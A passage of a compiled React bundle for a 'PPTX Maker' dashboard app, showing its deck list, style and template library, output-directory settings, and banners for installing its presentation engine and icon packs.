								})
							]
						}),
						currentStyle && /* @__PURE__ */ jsxs(Fragment, { children: [styleHtmlQuery.isLoading && /* @__PURE__ */ jsx("div", {
							className: "text-sm text-muted",
							children: i18nT("apps.pptxMaker.libraryPanel.loading")
						}), styleHtmlQuery.data && /* @__PURE__ */ jsx(BoardFrame, {
							html: styleHtmlQuery.data.fullHtml,
							title: i18nT("apps.pptxMaker.libraryPanel.style_preview")
						})] }),
						currentTemplate && /* @__PURE__ */ jsxs("div", {
							className: "flex flex-col gap-2",
							children: [
								currentTemplate.theme_colors?.background && /* @__PURE__ */ jsxs("div", {
									className: "rounded-lg h-24 flex items-center justify-between px-4 border border-border",
									style: { background: currentTemplate.theme_colors.background },
									children: [/* @__PURE__ */ jsx("span", {
										className: "text-lg",
										style: { color: currentTemplate.theme_colors.text || "#fff" },
										children: fontSpecimen()
									}), /* @__PURE__ */ jsx("div", {
										className: "flex gap-1.5",
										children: templateAccents(currentTemplate.theme_colors).map((color) => /* @__PURE__ */ jsx("span", {
											className: "w-4 h-4 rounded-full",
											style: { background: color }
										}, color))
									})]
								}),
								(currentTemplate.fonts?.halfwidth || currentTemplate.fonts?.fullwidth) && /* @__PURE__ */ jsx("div", {
									className: "text-[13px] text-muted",
									children: i18nT("apps.pptxMaker.libraryPanel.fonts", { fonts: [currentTemplate.fonts?.halfwidth, currentTemplate.fonts?.fullwidth].filter(Boolean).join(" / ") })
								}),
								/* @__PURE__ */ jsx("div", {
									className: "text-[13px] text-muted",
									children: i18nT("apps.pptxMaker.libraryPanel.layouts", { count: currentTemplate.layout_count ?? 0 })
								}),
								currentTemplate.description && /* @__PURE__ */ jsx("div", {
									className: "text-[13px] text-text",
									children: currentTemplate.description
								})
							]
						})
					]
				})]
			})
		]
	});
}
// src/PptxMakerPage.tsx
/**
* PptxMakerPage — the PPTX Maker studio.
*
* An installed app's page, mounted by the dashboard's AppHost from this
* repository's bundle. Every call to the app's in-gateway routes goes through the
* host's permission-scoped client (see `api.ts`).
*
* Three views behind one segmented control:
* - **Decks** — the deck list beside the tabbed deliverable viewer. This is where
*   a deck being built is watched: the viewer follows whichever deliverable the
*   agent just wrote.
* - **Library** — styles and .pptx templates (import, rename, pin, delete).
* - **Settings** — the deck output directory.
*
* Deck GENERATION happens in chat, not here: the app ships four agents
* (`pptx-maker-spec`, `pptx-maker-vibe`, `pptx-maker-composer`, `pptx-maker-style`) and the page links
* into a chat session on one of them. Keeping generation in the real chat surface
* means the user gets the full native chat (follow-up chips, question cards, tool
* groups, steer-send) rather than a reduced embed.
*/
/**
* The agents this app ships, in the order they are offered.
*
* The catalog keys are FULL literals rather than a suffix interpolated at the call
* site: a key assembled from parts exists nowhere in the source, so the extractor
* and the unused-key tooling cannot see it and it renders as the raw dotted string
* if it ever goes missing (`dynamicKeys.test.ts`).
*/
var CHAT_AGENT_LABEL_KEY = {
	"pptx-maker-spec": "apps.pptxMaker.pptxMakerPage.mode_spec",
	"pptx-maker-vibe": "apps.pptxMaker.pptxMakerPage.mode_vibe",
	"pptx-maker-style": "apps.pptxMaker.pptxMakerPage.mode_style"
};
var CHAT_AGENT_HINT_KEY = {
	"pptx-maker-spec": "apps.pptxMaker.pptxMakerPage.mode_spec_hint",
	"pptx-maker-vibe": "apps.pptxMaker.pptxMakerPage.mode_vibe_hint",
	"pptx-maker-style": "apps.pptxMaker.pptxMakerPage.mode_style_hint"
};
/**
* Display order. Keyed MAPS above rather than a list of `{agent, labelKey}` records,
* because `check-i18n-keys.mjs` resolves an index into an object literal but not a
* field read off an array element — so the record form left both keys unverifiable
* (`i18nT(entry.labelKey)` widens to `string`) and exempted them from every catalog
* check. Indexing a keyed map is the pattern that gate names.
*/
/**
* The DECLARED agent name is the dispatchable identifier.
*
* These values reach the host's chat launcher (`openChat({ agent })`), which
* creates the session on that agent, and from there dispatch runs
* `config.loader.resolve_agent_bindings` -> `_materialized_kiro_agent`, whose
* snapshot is built by `_scan_materialized_agents` from each registered config's
* `name` field. `bridges._register_agents` writes the FILE as
* `{app}--{agent}.json`, but that double-hyphen stem is only the on-disk
* filename — it is not in the dispatchable set (the stem is used only when a
* config declares no name), so sending it makes resolution fall through to the
* default agent silently. Same for the slash namespace form.
* `tests/test_agents.py` pins these to the declared names in the app's
* shipped agent JSONs so the two cannot drift.
*/
var CHAT_AGENTS = [
	"pptx-maker-spec",
	"pptx-maker-vibe",
	"pptx-maker-style"
];
/** Banner shown until the presentation engine has been provisioned. */
function EngineBanner() {
	const queryClient = useQueryClient();
	const { data } = useQuery({
		queryKey: ["pptx-maker", "engine"],
		queryFn: () => pptxMakerApi.engine(),
		refetchInterval: (query) => query.state.data?.provision.state === "running" ? POLL_PROVISION_MS : POLL_IDLE_MS
	});
	const provisionMutation = useMutation({
		mutationFn: () => pptxMakerApi.provisionEngine(),
		onSuccess: () => queryClient.invalidateQueries({ queryKey: ["pptx-maker", "engine"] })
	});
	if (!data || data.ready) return null;
	const running = data.provision.state === "running";
	const failed = data.provision.state === "error";
	const lastLine = data.provision.log.split("\n").filter(Boolean).pop() ?? "";
	return /* @__PURE__ */ jsx(Card, {
		className: "mb-4 animate-rise",
		children: /* @__PURE__ */ jsxs("div", {
			className: "flex items-start gap-3 flex-wrap",
			children: [
				running ? /* @__PURE__ */ jsx(Loader2, { className: "lucide-inline text-accent animate-spin shrink-0" }) : /* @__PURE__ */ jsx(AlertTriangle, { className: "lucide-inline text-warn shrink-0" }),
				/* @__PURE__ */ jsxs("div", {
					className: "flex-1 min-w-[240px]",
					children: [
						/* @__PURE__ */ jsx("div", {
							className: "text-sm text-text",
							children: running ? i18nT("apps.pptxMaker.pptxMakerPage.engine_installing", { seconds: data.provision.elapsed }) : failed ? i18nT("apps.pptxMaker.pptxMakerPage.engine_install_failed") : i18nT("apps.pptxMaker.pptxMakerPage.engine_not_installed")
						}),
						/* @__PURE__ */ jsx("div", {
							className: "text-[12px] text-muted mt-1",
							children: i18nT("apps.pptxMaker.pptxMakerPage.engine_requirements", { tag: data.pinnedTag })
						}),
						lastLine && /* @__PURE__ */ jsx("div", {
							className: "text-[12px] text-muted font-mono mt-1 truncate",
							children: lastLine
						})
					]
				}),
				!running && /* @__PURE__ */ jsxs(SendBtn, {
					onClick: () => provisionMutation.mutate(),
					children: [/* @__PURE__ */ jsx(Download, { className: "lucide-inline" }), failed ? i18nT("apps.pptxMaker.pptxMakerPage.retry_install") : i18nT("apps.pptxMaker.pptxMakerPage.install_engine")]
				})
			]
		})
	});
}
/**
* The engine's icon packs, offered once the engine is ready and they are not.
*
* The engine refuses to compose a slide without them: its asset search exits
* the MCP server when no pack is installed, which the agent reports as its tool
* going offline. The built-in served the download (`POST /assets/provision`)
* but no page offered it, so a deck stopped at its outline.
*/
function IconPacksNote() {
	const queryClient = useQueryClient();
	const engine = useQuery({
		queryKey: ["pptx-maker", "engine"],
		queryFn: () => pptxMakerApi.engine(),
		refetchInterval: POLL_IDLE_MS
	});
	const ready = Boolean(engine.data?.ready);
	const { data } = useQuery({
		queryKey: ["pptx-maker", "assets"],
		queryFn: () => pptxMakerApi.assets(),
		enabled: ready,
		refetchInterval: (query) => query.state.data?.state === "running" ? POLL_PROVISION_MS : POLL_IDLE_MS
	});
	const provisionMutation = useMutation({
		mutationFn: () => pptxMakerApi.provisionAssets(),
		onSuccess: () => queryClient.invalidateQueries({ queryKey: ["pptx-maker", "assets"] })
	});
	if (!ready || !data || data.ready) return null;
	const running = data.state === "running";
	const failed = data.state === "error";
	return /* @__PURE__ */ jsx(Card, {
		className: "mb-4 animate-rise",
		"data-testid": "pptx-icon-packs",
		children: /* @__PURE__ */ jsxs("div", {
			className: "flex items-start gap-3 flex-wrap",
			children: [
				running ? /* @__PURE__ */ jsx(Loader2, { className: "lucide-inline text-accent animate-spin shrink-0" }) : /* @__PURE__ */ jsx(AlertTriangle, { className: "lucide-inline text-warn shrink-0" }),
				/* @__PURE__ */ jsxs("div", {
					className: "flex-1 min-w-[240px]",
					children: [/* @__PURE__ */ jsx("div", {
						className: "text-sm text-text",
						children: running ? i18nT("apps.pptxMaker.pptxMakerPage.icon_packs_installing", { seconds: data.elapsed }) : failed ? i18nT("apps.pptxMaker.pptxMakerPage.icon_packs_failed") : i18nT("apps.pptxMaker.pptxMakerPage.icon_packs_missing")
					}), /* @__PURE__ */ jsx("div", {
						className: "text-[12px] text-muted mt-1",
						children: i18nT("apps.pptxMaker.pptxMakerPage.icon_packs_hint")
					})]
				}),
				!running && /* @__PURE__ */ jsxs(SendBtn, {
					onClick: () => provisionMutation.mutate(),
					disabled: provisionMutation.isPending,
					children: [/* @__PURE__ */ jsx(Download, { className: "lucide-inline" }), i18nT("apps.pptxMaker.pptxMakerPage.install_icon_packs")]
				})
			]
		})
	});
}
/**
* Non-blocking note about the optional preview binaries still missing.
*
* Shows the install command for each one, because the previous copy named the
* missing tool and stopped there — leaving the user with a warning and no next
* step. `pdftoppm` no longer appears here at all on a provisioned install (the
* app ships its own), so in practice this is the LibreOffice note.
*/
function DepsNote() {
	const { data } = useQuery({
		queryKey: ["pptx-maker", "deps"],
		queryFn: () => pptxMakerApi.deps(),
		refetchInterval: POLL_IDLE_MS
	});
	if (!data || data.missing.length === 0) return null;
	const labels = data.missing.map((key) => data.labels[key] ?? key).join(" / ");
	const hints = data.missing.map((key) => data.hints?.[key]).filter(Boolean);
	const text = hints.length ? i18nT("apps.pptxMaker.pptxMakerPage.optional_deps_missing_with_hint", {
		labels,
		command: hints.join(" / ")
	}) : i18nT("apps.pptxMaker.pptxMakerPage.optional_deps_missing", { labels });
	return /* @__PURE__ */ jsxs("div", {
		className: "mb-4 text-[12px] text-muted flex items-start gap-2",
		children: [/* @__PURE__ */ jsx(AlertTriangle, { className: "lucide-inline text-warn shrink-0" }), /* @__PURE__ */ jsx("span", {
			className: "min-w-0",
			children: text
		})]
	});
}
/** The deck output directory. */
function SettingsView() {
	const queryClient = useQueryClient();
	const [draft, setDraft] = useState(null);
	const { data, isLoading } = useQuery({
		queryKey: ["pptx-maker", "config"],
		queryFn: () => pptxMakerApi.config()
	});
	const saveMutation = useMutation({
		mutationFn: (value) => pptxMakerApi.setDeckRoot(value),
		onSuccess: () => {
			setDraft(null);
			queryClient.invalidateQueries({ queryKey: ["pptx-maker", "config"] });
			queryClient.invalidateQueries({ queryKey: ["pptx-maker", "decks"] });
		}
	});
	if (isLoading || !data) return /* @__PURE__ */ jsx(Card, { children: /* @__PURE__ */ jsx("div", {
		className: "text-sm text-muted",
		children: i18nT("apps.pptxMaker.pptxMakerPage.loading")
	}) });
	const value = draft ?? data.deckRoot;
	return /* @__PURE__ */ jsxs(Card, { children: [
		/* @__PURE__ */ jsxs(CardTitle, { children: [
			i18nT("apps.pptxMaker.pptxMakerPage.deck_output_directory"),
			" ",
			/* @__PURE__ */ jsx(InfoTip, { text: i18nT("apps.pptxMaker.pptxMakerPage.deck_output_directory_tip") })
		] }),
		/* @__PURE__ */ jsxs("div", {
			className: "flex items-center gap-2 flex-wrap max-w-2xl",
			children: [
				/* @__PURE__ */ jsx(Input, {
					value,
					"aria-label": i18nT("apps.pptxMaker.pptxMakerPage.deck_output_directory"),
					placeholder: data.default,
					onChange: (event) => setDraft(event.target.value),
					className: "flex-1 min-w-[220px]"
				}),
				/* @__PURE__ */ jsx(SendBtn, {
					onClick: () => saveMutation.mutate(value.trim()),
					disabled: saveMutation.isPending || !value.trim() || value === data.deckRoot,
					children: i18nT("apps.pptxMaker.pptxMakerPage.save")
				}),
				draft !== null && /* @__PURE__ */ jsx(Btn, {
					onClick: () => setDraft(null),
					children: i18nT("apps.pptxMaker.pptxMakerPage.reset")
				})
			]
		}),
		saveMutation.isError && /* @__PURE__ */ jsx(ErrorNotice, {
			className: "mt-3",
			message: saveMutation.error.message,
			askAgent: draft === null
		}),
		saveMutation.isSuccess && /* @__PURE__ */ jsx("div", {
			className: "mt-3 text-[13px] text-ok",
			children: i18nT("apps.pptxMaker.pptxMakerPage.saved")
		})
	] });
}
function PptxMakerPage() {
	const { openChat } = useChatLauncher();
	const [view, setView] = useState("decks");
	const [libraryKind, setLibraryKind] = useState("styles");
	const [query, setQuery] = useState("");
	const [selectedDeck, setSelectedDeck] = useState(null);
	const decksQuery = useQuery({
		queryKey: ["pptx-maker", "decks"],
		queryFn: () => pptxMakerApi.decks(),
		refetchInterval: POLL_DECKS_MS
	});
	const decks = useMemo(() => decksQuery.data?.decks ?? [], [decksQuery.data]);
	const stylesQuery = useQuery({
		queryKey: ["pptx-maker", "styles"],
		queryFn: () => pptxMakerApi.styles()
	});
	const templatesQuery = useQuery({
		queryKey: ["pptx-maker", "templates"],
		queryFn: () => pptxMakerApi.templates()
	});
	const filtered = useMemo(() => filterDecks(decks, query), [decks, query]);
	const slideTotal = useMemo(() => decks.reduce((sum, deck) => sum + deck.slideCount, 0), [decks]);
	const finishedCount = useMemo(() => decks.filter((deck) => Boolean(deck.pptxUrl)).length, [decks]);
	const startChat = (agent) => openChat({
		agent,
		memoryMode: "persistent",
		sessionFolder: false
	});
	const activeDeck = selectedDeck ?? filtered[0]?.deckId ?? null;
	return /* @__PURE__ */ jsxs(Fragment, { children: [/* @__PURE__ */ jsx(PageHeader, {
		title: i18nT("apps.pptxMaker.pptxMakerPage.title"),
		subtitle: i18nT("apps.pptxMaker.pptxMakerPage.subtitle"),
		actions: /* @__PURE__ */ jsx(SegmentedControl, {
			segments: [
				{
					key: "decks",
					label: i18nT("apps.pptxMaker.pptxMakerPage.view_decks")
				},
				{
					key: "library",
					label: i18nT("apps.pptxMaker.pptxMakerPage.view_library")
				},
				{
					key: "settings",
					label: i18nT("apps.pptxMaker.pptxMakerPage.view_settings")
				}
			],
			value: view,
			onChange: (next) => setView(next),
			layoutId: "pptx-view",
			collapse: false
		})
	}), /* @__PURE__ */ jsxs("div", {
		className: "px-4 md:px-6 pb-8 overflow-y-auto flex-1 min-h-0",
		children: [
			/* @__PURE__ */ jsx(EngineBanner, {}),
			/* @__PURE__ */ jsx(IconPacksNote, {}),
			/* @__PURE__ */ jsx(DepsNote, {}),
			/* @__PURE__ */ jsxs("div", {
				className: "grid gap-3.5 grid-cols-[repeat(auto-fit,minmax(150px,1fr))] mb-6",
				children: [
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.pptxMaker.pptxMakerPage.stat_decks"),
						value: decks.length,
						accent: true
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.pptxMaker.pptxMakerPage.stat_slides"),
						value: slideTotal
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.pptxMaker.pptxMakerPage.stat_finished"),
						value: finishedCount
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.pptxMaker.pptxMakerPage.stat_styles"),
						value: stylesQuery.data?.styles.length ?? 0
					}),
					/* @__PURE__ */ jsx(StatCard, {
						label: i18nT("apps.pptxMaker.pptxMakerPage.stat_templates"),
						value: templatesQuery.data?.templates.length ?? 0
					})
				]
			}),
			view === "decks" && /* @__PURE__ */ jsxs(Fragment, { children: [/* @__PURE__ */ jsxs(Card, {
				className: "mb-4",
				children: [/* @__PURE__ */ jsxs(CardTitle, { children: [
					i18nT("apps.pptxMaker.pptxMakerPage.start_a_deck"),
					" ",
					/* @__PURE__ */ jsx(InfoTip, { text: i18nT("apps.pptxMaker.pptxMakerPage.start_a_deck_tip") })
				] }), /* @__PURE__ */ jsx("div", {
					className: "flex items-start gap-3 flex-wrap",
					children: CHAT_AGENTS.map((agent) => /* @__PURE__ */ jsxs("div", {
						className: "flex flex-col gap-1 max-w-[230px]",
						children: [/* @__PURE__ */ jsxs(SendBtn, {
							onClick: () => startChat(agent),
							children: [agent === "pptx-maker-style" ? /* @__PURE__ */ jsx(Sparkles, { className: "lucide-inline" }) : /* @__PURE__ */ jsx(MessageSquarePlus, { className: "lucide-inline" }), i18nT(CHAT_AGENT_LABEL_KEY[agent])]
						}), /* @__PURE__ */ jsx("span", {
							className: "text-[12px] text-muted",
							children: i18nT(CHAT_AGENT_HINT_KEY[agent])
						})]
					}, agent))
				})]
			}), /* @__PURE__ */ jsxs(Card, {
				className: "flex flex-col min-h-0",
				children: [
					/* @__PURE__ */ jsxs(CardTitle, { children: [
						i18nT("apps.pptxMaker.pptxMakerPage.decks"),
						" ",
						/* @__PURE__ */ jsx(InfoTip, { text: i18nT("apps.pptxMaker.pptxMakerPage.decks_tip") })
					] }),
					/* @__PURE__ */ jsx(SearchInput, {
						value: query,
						"aria-label": i18nT("apps.pptxMaker.pptxMakerPage.search_decks"),
						placeholder: i18nT("apps.pptxMaker.pptxMakerPage.search_decks"),
						onChange: (event) => setQuery(event.target.value),
						className: "mb-3"
					}),
					decksQuery.isLoading && /* @__PURE__ */ jsx("div", {
						className: "text-sm text-muted",
						children: i18nT("apps.pptxMaker.pptxMakerPage.loading")
					}),
					!decksQuery.isLoading && decks.length === 0 && /* @__PURE__ */ jsx(EmptyState, {
						icon: /* @__PURE__ */ jsx(Presentation, { className: "lucide-inline" }),
						title: i18nT("apps.pptxMaker.pptxMakerPage.no_decks_yet"),
						subtitle: i18nT("apps.pptxMaker.pptxMakerPage.no_decks_yet_hint")
					}),
					decks.length > 0 && filtered.length === 0 && /* @__PURE__ */ jsx(EmptyState, {
						icon: /* @__PURE__ */ jsx(Layers, { className: "lucide-inline" }),
						title: i18nT("apps.pptxMaker.pptxMakerPage.no_matching_decks")
					}),
					filtered.length > 0 && /* @__PURE__ */ jsxs("div", {
						className: "flex flex-col sm:flex-row gap-4 flex-1 min-h-0",
						children: [/* @__PURE__ */ jsx("div", {
							className: "w-full sm:w-60 shrink-0 max-h-[40vh] sm:max-h-none overflow-y-auto border-b sm:border-b-0 sm:border-r border-border pb-3 sm:pb-0 sm:pr-3",
							children: filtered.map((deck) => /* @__PURE__ */ jsxs(Clickable, {
								onClick: () => setSelectedDeck(deck.deckId),
								className: `w-full text-left px-2.5 py-2 rounded-md mb-1 text-sm cursor-pointer transition-colors hover:bg-bg-elevated ${activeDeck === deck.deckId ? "bg-bg-elevated text-accent" : "text-text"}`,
								children: [/* @__PURE__ */ jsx("div", {
									className: "truncate font-medium",
									children: deck.name
								}), /* @__PURE__ */ jsx("div", {
									className: "text-[12px] text-muted",
									children: i18nT("apps.pptxMaker.pptxMakerPage.slide_count", { count: deck.slideCount })
								})]
							}, deck.deckId))
						}), /* @__PURE__ */ jsx("div", {
							className: "flex-1 min-w-0 flex flex-col min-h-0",
							children: activeDeck ? /* @__PURE__ */ jsx(DeckViewer, { deckId: activeDeck }) : /* @__PURE__ */ jsx("div", {
								className: "text-sm text-muted",
								children: i18nT("apps.pptxMaker.pptxMakerPage.select_a_deck")
							})
						})]
					})
				]
			})] }),
			view === "library" && /* @__PURE__ */ jsxs(Fragment, { children: [/* @__PURE__ */ jsx("div", {
				className: "mb-4",
				children: /* @__PURE__ */ jsx(SegmentedControl, {
					segments: [{
						key: "styles",
						label: i18nT("apps.pptxMaker.pptxMakerPage.view_styles")
					}, {
						key: "templates",
						label: i18nT("apps.pptxMaker.pptxMakerPage.view_templates")
					}],
					value: libraryKind,
					onChange: (next) => setLibraryKind(next),
					layoutId: "pptx-library",
					collapse: false
				})
			}), /* @__PURE__ */ jsx(LibraryPanel, { kind: libraryKind })] }),
			view === "settings" && /* @__PURE__ */ jsx(SettingsView, {})
		]
	})] });
}
// src/index.tsx
/**
* The bundle's entry: AppHost lazy-imports this module and renders its default
* export as the app's page.
*
* Two things happen here once, for the whole page. The host's permission-scoped
* API client becomes the transport every PPTX Maker call goes through
* (`api.setTransport`), and the host's language generation is subscribed to,
* which repaints the page on a language switch: `t` reads the active locale at
* call time, and this component's re-render reaches every child.
*/
function PptxMakerApp() {
	useLanguageGeneration();
	setTransport(useAppApi());
	return /* @__PURE__ */ jsx("div", {
		className: "flex flex-col flex-1 min-h-0 h-full",
		children: /* @__PURE__ */ jsx(PptxMakerPage, {})
	});
}
export { PptxMakerApp as default };
